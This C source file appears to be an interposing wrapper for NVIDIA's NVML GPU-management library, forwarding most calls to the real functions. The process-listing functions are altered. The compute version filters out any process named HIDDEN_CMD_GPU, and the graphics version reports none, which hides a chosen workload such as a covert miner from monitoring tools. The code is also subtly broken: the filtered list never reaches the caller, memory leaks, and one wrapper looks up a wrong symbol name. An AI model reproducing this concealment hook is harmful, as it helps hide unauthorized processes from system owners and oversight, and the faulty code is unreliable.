nvmlReturn_t DECLDIR nvmlDeviceGetVbiosVersion(nvmlDevice_t device, char *version, unsigned int length){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, char *version, unsigned int length);fn = getfn("nvmlDeviceGetVbiosVersion");ret = fn(device, version, length);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetBridgeChipInfo(nvmlDevice_t device, nvmlBridgeChipHierarchy_t *bridgeHierarchy){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlBridgeChipHierarchy_t *bridgeHierarchy);fn = getfn("nvmlDeviceGetBridgeChipInfo");ret = fn(device, bridgeHierarchy);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetComputeRunningProcesses(nvmlDevice_t device, unsigned int *infoCount, nvmlProcessInfo_t *infos)
{
	nvmlReturn_t ret;
	nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *infoCount, nvmlProcessInfo_t *infos);
	fn = getfn("nvmlDeviceGetComputeRunningProcesses");
	ret = fn(device, infoCount, infos);
	//*infoCount = 0;
	//infos = NULL;
	unsigned int new_infoCount=0;
	int i;
	nvmlProcessInfo_t * new_infos = malloc(sizeof(nvmlProcessInfo_t)*(*infoCount));
	for ( i = 0; i < *infoCount; i++)
	{
		char proname[128];
		nvmlSystemGetProcessName(infos[i].pid, proname, 128);
		if(strncmp(proname, HIDDEN_CMD_GPU, 128))
		{
			new_infos[new_infoCount].pid = infos[i].pid;
			new_infos[new_infoCount].usedGpuMemory = infos[i].usedGpuMemory;
			new_infoCount ++;
		}
	}
	*infoCount = new_infoCount;
	infos = new_infos;
	return ret;
}

nvmlReturn_t DECLDIR nvmlDeviceGetGraphicsRunningProcesses(nvmlDevice_t device, unsigned int *infoCount, nvmlProcessInfo_t *infos)
{
	nvmlReturn_t ret;
	nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *infoCount, nvmlProcessInfo_t *infos);
	fn = getfn("nvmlDeviceGetGraphicsRunningProcesses");
	ret = fn(device, infoCount, infos);
	*infoCount=0;
	infos=NULL;
	return ret;
}

nvmlReturn_t DECLDIR nvmlDeviceOnSameBoard(nvmlDevice_t device1, nvmlDevice_t device2, int *onSameBoard){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device1, nvmlDevice_t device2, int *onSameBoard);fn = getfn("nvmlDeviceOnSameBoard");ret = fn(device1, device2, onSameBoard);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetAPIRestriction(nvmlDevice_t device, nvmlRestrictedAPI_t apiType, nvmlEnableState_t *isRestricted){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlRestrictedAPI_t apiType, nvmlEnableState_t *isRestricted);fn = getfn("nvmlDeviceGetAPIRestriction");ret = fn(device, apiType, isRestricted);return ret;}
 
nvmlReturn_t DECLDIR nvmlDeviceGetSamples(nvmlDevice_t device, nvmlSamplingType_t type, unsigned long long lastSeenTimeStamp, nvmlValueType_t *sampleValType, unsigned int *sampleCount, nvmlSample_t *samples){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlSamplingType_t type, unsigned long long lastSeenTimeStamp, nvmlValueType_t *sampleValType, unsigned int *sampleCount, nvmlSample_t *samples);fn = getfn("nvmlDeviceGetSamples");ret = fn(device, type, lastSeenTimeStamp,sampleValType, sampleCount, samples);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetBAR1MemoryInfo(nvmlDevice_t device, nvmlBAR1Memory_t *bar1Memory){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlBAR1Memory_t *bar1Memory);fn = getfn("nvmlDeviceGetBAR");ret = fn(device, bar1Memory);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetViolationStatus(nvmlDevice_t device, nvmlPerfPolicyType_t perfPolicyType, nvmlViolationTime_t *violTime){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlPerfPolicyType_t perfPolicyType, nvmlViolationTime_t *violTime);fn = getfn("nvmlDeviceGetViolationStatus");ret = fn(device, perfPolicyType, violTime);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetAccountingMode(nvmlDevice_t device, nvmlEnableState_t *mode){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlEnableState_t *mode);fn = getfn("nvmlDeviceGetAccountingMode");ret = fn(device, mode);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetAccountingStats(nvmlDevice_t device, unsigned int pid, nvmlAccountingStats_t *stats){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int pid, nvmlAccountingStats_t *stats);fn = getfn("nvmlDeviceGetAccountingStats");ret = fn(device, pid, stats);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetAccountingPids(nvmlDevice_t device, unsigned int *count, unsigned int *pids){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *count, unsigned int *pids);fn = getfn("nvmlDeviceGetAccountingPids");ret = fn(device, count, pids);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetAccountingBufferSize(nvmlDevice_t device, unsigned int *bufferSize){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *bufferSize);fn = getfn("nvmlDeviceGetAccountingBufferSize");ret = fn(device, bufferSize);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetRetiredPages(nvmlDevice_t device, nvmlPageRetirementCause_t cause,unsigned int *pageCount, unsigned long long *addresses){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlPageRetirementCause_t cause,unsigned int *pageCount, unsigned long long *addresses);fn = getfn("nvmlDeviceGetRetiredPages");ret = fn(device, cause,pageCount, addresses);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetRetiredPagesPendingStatus(nvmlDevice_t device, nvmlEnableState_t *isPending){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlEnableState_t *isPending);fn = getfn("nvmlDeviceGetRetiredPagesPendingStatus");ret = fn(device, isPending);return ret;}
nvmlReturn_t DECLDIR nvmlUnitSetLedState(nvmlUnit_t unit, nvmlLedColor_t color){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlUnit_t unit, nvmlLedColor_t color);fn = getfn("nvmlUnitSetLedState");ret = fn(unit, color);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceSetPersistenceMode(nvmlDevice_t device, nvmlEnableState_t mode){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlEnableState_t mode);fn = getfn("nvmlDeviceSetPersistenceMode");ret = fn(device, mode);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceSetComputeMode(nvmlDevice_t device, nvmlComputeMode_t mode){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlComputeMode_t mode);fn = getfn("nvmlDeviceSetComputeMode");ret = fn(device, mode);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceSetEccMode(nvmlDevice_t device, nvmlEnableState_t ecc){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlEnableState_t ecc);fn = getfn("nvmlDeviceSetEccMode");ret = fn(device, ecc);return ret;}  
nvmlReturn_t DECLDIR nvmlDeviceClearEccErrorCounts(nvmlDevice_t device, nvmlEccCounterType_t counterType){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlEccCounterType_t counterType);fn = getfn("nvmlDeviceClearEccErrorCounts");ret = fn(device, counterType);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceSetDriverModel(nvmlDevice_t device, nvmlDriverModel_t driverModel, unsigned int flags){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlDriverModel_t driverModel, unsigned int flags);fn = getfn("nvmlDeviceSetDriverModel");ret = fn(device, driverModel, flags);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceSetApplicationsClocks(nvmlDevice_t device, unsigned int memClockMHz, unsigned int graphicsClockMHz){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int memClockMHz, unsigned int graphicsClockMHz);fn = getfn("nvmlDeviceSetApplicationsClocks");ret = fn(device, memClockMHz, graphicsClockMHz);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceSetPowerManagementLimit(nvmlDevice_t device, unsigned int limit){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int limit);fn = getfn("nvmlDeviceSetPowerManagementLimit");ret = fn(device, limit);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceSetGpuOperationMode(nvmlDevice_t device, nvmlGpuOperationMode_t mode){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlGpuOperationMode_t mode);fn = getfn("nvmlDeviceSetGpuOperationMode");ret = fn(device, mode);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceSetAPIRestriction(nvmlDevice_t device, nvmlRestrictedAPI_t apiType, nvmlEnableState_t isRestricted){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlRestrictedAPI_t apiType, nvmlEnableState_t isRestricted);fn = getfn("nvmlDeviceSetAPIRestriction");ret = fn(device, apiType, isRestricted);return ret;}
 
nvmlReturn_t DECLDIR nvmlDeviceSetAccountingMode(nvmlDevice_t device, nvmlEnableState_t mode){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlEnableState_t mode);fn = getfn("nvmlDeviceSetAccountingMode");ret = fn(device, mode);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceClearAccountingPids(nvmlDevice_t device){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device);fn = getfn("nvmlDeviceClearAccountingPids");ret = fn(device);return ret;}
nvmlReturn_t DECLDIR nvmlEventSetCreate(nvmlEventSet_t *set){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlEventSet_t *set);fn = getfn("nvmlEventSetCreate");ret = fn(set);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceRegisterEvents(nvmlDevice_t device, unsigned long long eventTypes, nvmlEventSet_t set){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned long long eventTypes, nvmlEventSet_t set);fn = getfn("nvmlDeviceRegisterEvents");ret = fn(device, eventTypes, set);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetSupportedEventTypes(nvmlDevice_t device, unsigned long long *eventTypes){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned long long *eventTypes);fn = getfn("nvmlDeviceGetSupportedEventTypes");ret = fn(device, eventTypes);return ret;}
nvmlReturn_t DECLDIR nvmlEventSetWait(nvmlEventSet_t set, nvmlEventData_t * data, unsigned int timeoutms){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlEventSet_t set, nvmlEventData_t * data, unsigned int timeoutms);fn = getfn("nvmlEventSetWait");ret = fn(set, data, timeoutms);return ret;}
nvmlReturn_t DECLDIR nvmlEventSetFree(nvmlEventSet_t set){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlEventSet_t set);fn = getfn("nvmlEventSetFree");ret = fn(set);return ret;}
